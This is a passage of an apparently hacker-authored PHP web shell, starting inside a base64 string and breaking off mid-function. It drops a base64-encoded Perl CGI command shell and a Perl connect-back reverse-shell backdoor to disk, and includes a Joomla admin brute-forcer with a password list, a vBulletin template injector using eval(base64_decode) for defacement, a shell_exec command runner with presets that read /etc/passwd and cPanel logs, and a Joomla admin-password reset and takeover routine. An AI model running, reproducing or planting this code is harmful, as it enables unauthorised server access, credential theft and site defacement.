dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe> 

 
 </div>"; }
//////////////////////////////////////////////////////////////////////////////////////////////


elseif(isset($_GET['x']) && ($_GET['x'] == 'jbrute')) 
{ 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jbrute" method="post">

	<meta name="author" content="RetnOHacK" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="RetnOHacK #Procoder'z Team Albanian" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Bruter Force ]=--+</font></b><br /><br />
<form method="post" action="" enctype="multipart/form-data"> 
<table class="tabnet" width="38%" border="0"><center>
<th colspan="2">Joomla Brute Force</th>
<tr><td><p ><font  class="d1">User :</font></th>
<input class="inputz" type='text' name="usr" value="admin" size="15"> </font></center><br /><br /></p>
</td></tr>
<tr><td><font class="">Sites list :</font> 
</td><td><font class="" >Pass list :</font></td></tr>
<tr>
		<td>
<textarea name="sites" style="background:black;" cols="40" rows="13" ></textarea>
</td><td>
<textarea name="w0rds" style="background:black;" cols="40" rows="13" >
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
</td></tr><center><tr><td>
<font > 
<input class="inputzbut" type="submit" name="x" value="start" id="d4"> 
</font></td></tr><br>
tanks for procoder'z team albanian<br></center></table>
</form></center>
<? 
@set_time_limit(0); 

if($_POST['x']){ 

echo "<hr>"; 

$sites = explode("\n",$_POST["sites"]); // Get Sites 
$w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt 

$Attack = new Joomla_brute_Force(); // Active Class 


foreach($w0rds as $pwd){ 

foreach($sites as $site){ 


$Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D 
flush();flush(); 

} 

} 

} 


# Class & Function'z 

function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); } 

class Joomla_brute_Force{ 

public function check_it($site,$user,$pass){ // print result 

if(eregi('com_config',$this->post($site,$user,$pass))){ 

echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
$f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f); 
flush(); 
}else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();} 

} 

public function post($site,$user,$pass){ // Post -> user & pass 

$token = $this->extract_token($site); 

$curl=curl_init(); 

curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_POST,1); 
curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

public function extract_token($site){ // get token from source for -> function post 

$source = $this->get_source($site); 

preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token); 

return $token[1][0]; 

} 

public function get_source($site){ // get source for -> function extract_token 

$curl=curl_init(); 
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

} 
}
/////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
   {
   ?>
   <form action="?y=<?php echo $pwd; ?>&x=vb" method="post">
   <br><br><br><div align="center">
   <H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
   <b><font color="#00FF00">+--=[ VB Index Changer ]=--+</font></b>
   </div><br>
   <?
   if(empty($_POST['index'])){
   echo "<center><FORM method=\"POST\">";
   echo "<table class=\"tabnet\">
<th colspan=\"2\">Vb Index Changer</th>
<tr><td>host </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"localhost\" value=\"localhost\"></td></tr>
<tr><td>database </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"database\" value=\"forum_vb\"></td></tr>
<tr><td>username </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"username\" value=\"user_vb\"></td></tr>
<tr><td>password </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"password\" value=\"vb\"></td></tr>
</tr>
<th colspan=\"2\">Your Index Code</th></table><table class=\"tabnet\">
<TEXTAREA name=\"index\" rows=\"13\" style=\"background:black\" border=\"1\" cols=\"69\" name=\"code\">your index code</TEXTAREA><br>
<INPUT class=\"inputzbut\" type=\"submit\" value=\"setting\" name=\"send\">
</FORM></table></center>";
    }else{
    $localhost = $_POST['localhost'];
    $database = $_POST['database'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $index = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());
    $index=str_replace("\'","'",$index);
    $set_index = "{\${eval(base64_decode(\'";
    $set_index .= base64_encode("echo \"$index\";");
    $set_index .= "\'))}}{\${exit()}}</textarea>";
    echo("UPDATE template SET template ='".$set_index."' ") ;
    $ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());
    if($ok){
    echo "!! update finish !!<br><br>";
    } 
  }
}

//////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'bypass')) 
{ 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=bypass" method="post">

<?php
echo "<center/><br/><b><font color=#00ff00>-=[ Command  Bypass Exploit ]=-</font></b><br>
";
print_r('
<pre>
<form method="POST" action="">
<b><font color=#00ff00><b><font color="#00ff00">Command  :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#00ff00">Menu Bypass  :=)  </font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";

echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
 "</div>"; }

 ///////////////////////////////////////////////////////////////////////////
 
 elseif(isset($_GET['x']) && ($_GET['x'] == 'jodexer'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jodexer" method="post">

<?php

function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    if ($_POST['form_action'])
    {
    
    $text=file_get_contents($_POST['file']);
    $username=entre2v2($text,"public $user = '","';");
    $password=entre2v2($text,"public $password = ', '","';");
    $dbname=entre2v2($text,"public $db = ', '","';");
    $dbprefix=entre2v2($text,"public $dbprefix = '","';");
    $site_url=($_POST['site_url']);
    
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    $co=randomt();  
      /*
    echo($username);
    echo("<br>");
    echo($password);
    echo("<br>");
    echo($dbname);
    echo("<br>");
    echo($dbprefix);
    echo("<br>");
    */
    $co=randomt();
    
    if ($_POST['form_action'])
    {
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    
    
    
    
          $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;
    
             mysql_select_db($dbname,$link) ;
    
    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
    echo("<br>[+] Changing admin password to 123456789");  
                    
                     $req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
                    
    if ( $req )
    {
    #################################################################
    ######################        V1.6         ######################
    #################################################################
    
                  
    $req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
             $data = mysql_fetch_array($req);
    $template_id=$data["extension_id"];
    
    $url2=$site_url."/index.php";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    
    
    $buffer = curl_exec($ch);
    
    $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
    
    ///////////////////////////
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[~] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
